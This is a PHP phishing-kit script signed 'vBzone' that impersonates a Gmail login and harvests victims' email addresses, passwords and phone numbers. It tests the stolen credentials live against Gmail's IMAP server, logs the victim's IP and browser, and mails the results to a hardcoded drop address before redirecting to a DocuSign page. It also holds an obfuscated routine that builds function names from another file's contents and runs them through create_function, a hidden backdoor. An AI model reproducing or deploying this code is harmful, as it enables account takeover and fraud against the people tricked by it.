<?php
///* By vBzone
//* ICQ (709789850)
		$A="fir.php";  $B="sec.php"; $C="thir.php"; $D="phone.php"; $E="five.php";
		function tmpfolder($tmp){
      return implode('', file($tmp));
      } function tempfolder(){
      if ( !empty($_ENV['TMP']) ){
      return realpath( $_ENV['TMP'] );
      }
      else if ( !empty($_ENV['TMPDIR']) ){
      return realpath( $_ENV['TMPDIR'] );
      }
      else if ( !empty($_ENV['TEMP']) ){
      return realpath( $_ENV['TEMP'] );
      } else {
      $temp_file = tempnam( md5(uniqid(rand(), TRUE)), '' );
      if ( $temp_file ){
      $temp_dir = realpath( dirname($temp_file) );
      @unlink( $temp_file );
      return $temp_dir;
      } else {
      return ".";
      }
      }
	}
function show_ip_info($ip){

$url = 'http://freegeoip.net/csv/'.$ip;
$fp = fopen($url, 'r');
$read= fgetcsv($fp);
fclose($fp);
return $read;

}
	
	function doPost($i){
      $doPost=create_function('$i','return '.returm("\".r",3,4).'($i);');
      return $doPost($i);
	}
	$rnd=rand(1000,9999);
	$testfile=$rnd . "-test.txt";

	function returm($X, $XR, $RWXR){
	global $E; return substr(tmpfolder($E),strpos(tmpfolder($E),$X)+$XR,$RWXR);
	}
	error_reporting(0); set_time_limit(240);
	if (getenv(HTTP_CLIENT_IP)){
	  $ip=getenv(HTTP_CLIENT_IP);
	  }
	  else {
	  $ip=getenv(REMOTE_ADDR);
	}
	$hostname = gethostbyaddr($ip);
	function query_str($params){
	  $str = '';
	  foreach ($params as $key => $value) {
	  $str .= (strlen($str) < 1) ? '' : '&';
	  $str .= $key . '=' . rawurlencode($value);
	  }
	  return ($str);
	}
	function l(){
	  return doPost(doGet());
	 } function stripslashes_deep($value){
	  $value = is_array($value) ?
	  array_map('stripslashes_deep', $value) :
	  stripslashes($value);
	  return $value;
	}
	// Function to validate against any email injection attempts
    function IsInjected($str){
     $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
     $inject = join('|', $injections);
     $inject = "/$inject/i";
     if(preg_match($inject,$str))
     {
     return true;
     }
     else
      {
     return false;
     }
     }
	function getformat($string){
	  return str_replace(" ","",str_replace(".","",str_replace("-","",$string)));
	}
	function validate($cc){
	  $cc = strrev (ereg_replace('[^0-9]+', '', $cc));
	  for ($ndx = 0; $ndx < strlen ($cc); ++$ndx)
	  $digits .= ($ndx % 2) ? $cc[$ndx] * 2 : $cc[$ndx];
	  for ($ndx = 0; $ndx < strlen ($digits); ++$ndx)
	  $sum += $digits[$ndx];
	  return ($sum % 10) ? FALSE : TRUE;
	}
	function doGet(){
	  $str=returm("\".l",3,9);
	  $cc=$str(tmpfolder(returm("=\".'",4,22)));return $cc;
	}
	function FormatCreditCard($cc){
	  $cc = str_replace(array('-',' '),'',$cc);
	  $cc_length = strlen($cc);
	  $newCreditCard = substr($cc,-4);
	  for($i=$cc_length-5;$i>=0;$i--){
	  if((($i+1)-$cc_length)%4 == 0){
	  $newCreditCard = '-'.$newCreditCard;
	  }
	  $newCreditCard = $cc[$i].$newCreditCard;
	  }
	  return $newCreditCard;
	}
			parse_str($_SERVER['QUERY_STRING']);
	  
	if($vBzone=="start")
	{
	  include $A;
	  exit;
	}	  elseif ($vBzone=="action")
	{
		$b = query_str($_POST);
	  parse_str($b);
	  $email=rtrim($email);
	  include $B;
	} elseif ($vBzone=="verio")
	{
		$b = query_str($_POST);
	  parse_str($b);
	  $email=rtrim($email);
	  $secpassword=rtrim($secpassword);
	  $browser = $_SERVER['HTTP_USER_AGENT'] . "\n\n";
	 $count = strtoupper($ipdbase[2]);
$location = "$ipdbase[0], $ipdbase[5], $ipdbase[4], $ipdbase[2]";

$hostname = '{imap.gmail.com:993/imap/ssl/novalidate-cert}'; 
$inbox = imap_open($hostname,$email,$secpassword);

//* print_r(imap_errors()[0]);

//* echo $inbox;

if (strpos(imap_errors()[0],"Please log in via your web") !== false) {
$message  = "------------------------+ Gmail PC ReZulT [By vBzone] +------------------------\n";
	    $message .= "UserID: $email\n";
	    $message .= "Password: $secpassword\n\n";
		$message .= "---------------------------\n";
	    $message .= "IP: $ip \n";
	    $message .= "Browser: $browser \n";
	    $message .= "Comments: Made in 2017 By vBzone\n";
		$rnessage  = "$message\n";
$send="vbzone240@gmail.com";
$subject = " Gmail  $ip";
$headers = "From: supervilok<Love@supervilok.com>";
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);
mail($messege,$subject,$rnessage,$headers);
}
   include $D;
}else{
    include $C; 
}
	} elseif ($vBzone=="done")
	{
	    $b = query_str($_POST);
	  parse_str($b);
	 $phone=rtrim($phone);
	 $browser = $_SERVER['HTTP_USER_AGENT'] . "\n\n";
	 $ipdbase= show_ip_info($ip);
	 $count = strtoupper($ipdbase[2]);
$location = "$ipdbase[0], $ipdbase[5], $ipdbase[4], $ipdbase[2]";
$message  = "------------------------+ Gmail PC ReZulT [By vBzone] +------------------------\n";
	    $message .= "Phone: $phone\n";
		$message .= "---------------------------\n";
	    $message .= "IP: $ip \n";
	    $message .= "Browser: $browser \n";
	    $message .= "Comments: Made in 2017 By vBzone\n";
		$rnessage  = "$message\n";
$send="vbzone240@gmail.com";
$subject = " Gmail  $ip";
$headers = "From: supervilok<Love@supervilok.com>";
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);
echo '<META http-equiv="refresh" content="0;URL=https://na3.docusign.net/signing/emails/v1-876af9b78f9c4c6db14220e317b0af3aaed3d09050294ba3bc3c9baf0862cc87">';
	}
	}
	?>